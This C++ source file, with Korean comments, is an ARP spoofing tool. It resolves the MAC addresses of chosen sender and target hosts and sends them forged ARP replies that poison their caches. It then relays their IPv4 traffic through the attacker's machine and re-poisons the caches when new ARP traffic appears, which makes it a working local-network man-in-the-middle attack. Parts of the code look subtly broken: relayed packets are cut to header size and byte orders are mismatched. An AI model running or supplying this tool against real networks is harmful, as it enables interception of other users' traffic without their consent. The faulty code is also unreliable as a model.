#include <cstdio>
#include <pcap.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <unistd.h>
#include <string.h>

#include "libnet.h"
#include "ethhdr.h"
#include "arphdr.h"

#define MAC_SIZE 6

#pragma pack(push, 1)


struct ipv4_hdr final {		//ip 헤더 구조체
	uint8_t 	version_ihl;
	uint8_t 	type_of_service;
	uint16_t 	total_length;
	uint16_t 	packet_id;
	uint16_t 	fragment_offset;
	uint8_t 	time_to_live;
	uint8_t 	next_proto_id;
	uint16_t 	hdr_checksum;
	uint32_t 	src_addr;
	uint32_t   	dst_addr;

};

struct EthIpPacket final {	//ip 패킷 구조체
	EthHdr eth_;
	ipv4_hdr ip_;

};

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

struct flow final {		//여러 쌍을 처리하기 위한 flow
	Ip sender_ip;
	Mac sender_mac;
	Ip target_ip;
	Mac target_mac;

};

#pragma pack(pop)

Ip get_ip(char* interface);
Mac get_mac(char* interface);
Mac get_want_mac(pcap_t* handle, Ip my_ip, Mac my_mac, Ip want_ip);
void arp_spoof(pcap_t* handle, Mac my_mac, flow* list, int flag);
void packet_relay(pcap_t* handle, const u_char* packet, Ip my_ip, Mac my_mac, flow* list, int flag);


void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2>]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if ((argc%2 != 0) || argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];    
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Ip my_ip;
	Mac my_mac;

	my_ip = get_ip(dev);
	my_mac = get_mac(dev);

	struct flow flow_list[(argc-2)/2];
	int flag = 0;

	for(int i=2;i<argc;i+=2)
	{
		Ip sender_ip;
		Mac sender_mac;
		Ip target_ip;
		Mac target_mac;


		sender_ip = Ip(argv[i]);
		sender_mac = get_want_mac(handle, my_ip, my_mac, sender_ip);
		target_ip = Ip(argv[i+1]);
		target_mac = get_want_mac(handle, my_ip, my_mac, target_ip);
	

		flow_list[flag].sender_ip = sender_ip;
		flow_list[flag].sender_mac = sender_mac;
		flow_list[flag].target_ip = target_ip;
		flow_list[flag].target_mac = target_mac;

		flag++;
	}
	for(int o=0;o<flag;o++)
	{
		printf("target mac %d: %s\n", o+1,std::string(flow_list[o].target_mac).c_str());	
		printf("sender mac %d: %s\n", o+1,std::string(flow_list[o].sender_mac).c_str());

	}
	arp_spoof(handle, my_mac, flow_list, flag);

	while(1)
	{
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			exit(1);
		}
		packet_relay(handle, packet, my_ip, my_mac, flow_list, flag);
	}

	pcap_close(handle);

}

Ip get_ip(char* interface) 
{
	uint32_t my_ip;
	struct ifreq ifr;

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	if(sockfd < 0) 
	{
		printf("socket error\n");
		exit(1);
	}

	strcpy(ifr.ifr_name, interface);

	if(ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) 
	{
		printf("ioctl failed\n");
		exit(1);
	}

	memcpy(&my_ip, ifr.ifr_hwaddr.sa_data + 2, sizeof(my_ip));
	close(sockfd);

	uint32_t tosend = ntohl(my_ip);
	return Ip(tosend);
}

Mac get_mac(char* interface)
{
	uint8_t my_mac[6];
	struct ifreq ifr;

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	if(sockfd < 0) 
	{
		printf("socket error\n");
		exit(1);
	}

	strcpy(ifr.ifr_name, interface);

	if(ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
		printf("ioctl failed (Mac)\n");
		exit(1);
	}

	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, sizeof(my_mac));
	close(sockfd);

	return Mac(my_mac);
}


Mac get_want_mac(pcap_t* handle, Ip my_ip, Mac my_mac, Ip want_ip)
{

	EthArpPacket arp_request;
	Mac want_mac;    

	arp_request.eth_.smac_ = my_mac;
	arp_request.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	arp_request.eth_.type_ = htons(EthHdr::Arp);

	arp_request.arp_.hrd_ = htons(ArpHdr::ETHER);
	arp_request.arp_.pro_ = htons(EthHdr::Ip4);
	arp_request.arp_.pln_ = Ip::SIZE;
	arp_request.arp_.hln_ = Mac::SIZE;
	arp_request.arp_.op_ = htons(ArpHdr::Request);
	arp_request.arp_.smac_ = my_mac;
	arp_request.arp_.sip_ = htonl(my_ip);
	arp_request.arp_.tmac_ = Mac("00:00:00:00:00:00");
	arp_request.arp_.tip_ = htonl(want_ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&arp_request), sizeof(EthArpPacket));
	if (res != 0)
	{
		printf("send error\n");
		exit(1);
	}

	while (1) 
	{
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthArpPacket arp_reply;
		memcpy(&arp_reply, packet, sizeof(EthArpPacket));

		if((arp_reply.eth_.type() == EthHdr::Arp) && (arp_reply.arp_.sip() == want_ip))
		{
			want_mac = arp_reply.eth_.smac();
			printf("want mac: %s\n",std::string(want_mac).c_str());
			break;
		}
	}
	return want_mac;
}

void arp_spoof(pcap_t* handle, Mac my_mac, flow* list, int flag)
{	
	for(int i=0;i<flag;i++)
	{
		EthArpPacket packet;
		packet.eth_.dmac_ = list[i].sender_mac;
		packet.eth_.smac_ = my_mac;
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = my_mac;
		packet.arp_.sip_ = htonl(list[i].target_ip);
		packet.arp_.tmac_ = list[i].sender_mac;
		packet.arp_.tip_ = htonl(list[i].sender_ip);

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
		if (res != 0)
		{
			printf("spoofing send error\n");
			exit(1);

		}
	}

}

void packet_relay(pcap_t* handle, const u_char* packet, Ip my_ip, Mac my_mac, flow* list, int flag)
{
	EthIpPacket relay_packet;
	EthArpPacket request_packet;
	memcpy(&relay_packet, packet, sizeof(relay_packet));
	memcpy(&request_packet, packet, sizeof(relay_packet));


	if ((relay_packet.eth_.type() == EthHdr::Ip4) && ((Ip)(relay_packet.ip_.dst_addr) != my_ip))
	{
		relay_packet.eth_.smac_ = my_mac;
		for(int i=0;i<flag;i++)
		{
			if(relay_packet.ip_.src_addr == list[i].target_ip)
			{	
				relay_packet.eth_.dmac_ = list[i].target_mac;
				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&relay_packet), sizeof(relay_packet));
				if (res != 0)
				{
					printf("relay error\n");
					exit(1);
				}
				printf("packet relayed\n");
			}
		}
	}

	else if(request_packet.eth_.type()==EthHdr::Arp)
	{
		for(int i=0;i<flag;i++)
		{
			if((Ip)(relay_packet.ip_.src_addr) == list[i].sender_ip)
			{
				arp_spoof(handle, my_mac, list, flag);
				printf("table spoofed\n");
			}

		}
	}
}

